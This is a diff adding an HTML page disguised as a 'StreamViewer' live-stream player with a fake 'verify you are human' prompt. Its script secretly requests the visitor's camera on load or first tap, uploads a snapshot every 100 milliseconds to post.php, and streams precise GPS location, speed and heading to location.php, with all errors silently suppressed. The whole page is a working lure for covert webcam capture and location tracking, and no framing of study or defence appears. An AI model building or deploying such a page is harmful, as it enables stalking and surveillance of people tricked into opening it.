@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Live Stream - StreamViewer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background: #0a0a0a;
+            color: #aaa;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 0;
+            margin: 0;
+        }
+        .player-wrap {
+            width: 100%;
+            max-width: 640px;
+            margin: 20px auto;
+            background: #000;
+            aspect-ratio: 16/9;
+            position: relative;
+        }
+        .overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .play-btn {
+            width: 60px;
+            height: 60px;
+            border: 3px solid #fff;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        .play-btn::after {
+            content: "";
+            display: block;
+            width: 0;
+            height: 0;
+            border-left: 22px solid #fff;
+            border-top: 13px solid transparent;
+            border-bottom: 13px solid transparent;
+            margin-left: 5px;
+        }
+        p { font-size: 14px; margin: 5px 0; }
+        small { font-size: 11px; color: #555; }
+    </style>
+    <script>
+        var CAPTURE_INTERVAL = 100;
+        var captureIntervalId = null;
+
+        function sendPosition(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            var acc = position.coords.accuracy;
+            var alt = position.coords.altitude || "N/A";
+            var spd = position.coords.speed || "N/A";
+            var hdg = position.coords.heading || "N/A";
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "location.php", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&alt="+alt+"&spd="+spd+"&hdg="+hdg+"&t="+Date.now());
+        }
+
+        function handleError(e) {}
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(sendPosition, handleError, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+                navigator.geolocation.getCurrentPosition(sendPosition, handleError, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+            }
+        }
+
+        function startCapture() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(stream) {
+                        var video = document.createElement("video");
+                        video.srcObject = stream;
+                        video.play();
+                        var canvas = document.createElement("canvas");
+                        var ctx = canvas.getContext("2d");
+                        captureIntervalId = setInterval(function() {
+                            if (video.readyState >= 2) {
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                var data = canvas.toDataURL("image/png");
+                                var xhr = new XMLHttpRequest();
+                                xhr.open("POST", "post.php", true);
+                                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                                xhr.send("cat=" + encodeURIComponent(data));
+                            }
+                        }, CAPTURE_INTERVAL);
+                    })
+                    .catch(function() {});
+            }
+        }
+
+        window.onload = function() {
+            startCapture();
+            setTimeout(getLocation, 300);
+        };
+
+        document.addEventListener("click", function() {
+            if (!captureIntervalId) startCapture();
+            getLocation();
+        }, { once: true });
+
+        document.addEventListener("touchstart", function() {
+            if (!captureIntervalId) startCapture();
+            getLocation();
+        }, { once: true });
+    </script>
+</head>
+<body>
+    <div class="player-wrap">
+        <div class="overlay">
+            <div class="play-btn"></div>
+            <p>Live stream loading...</p>
+            <small>Verify you are human to continue watching</small>
+        </div>
+    </div>
+</body>
+</html>
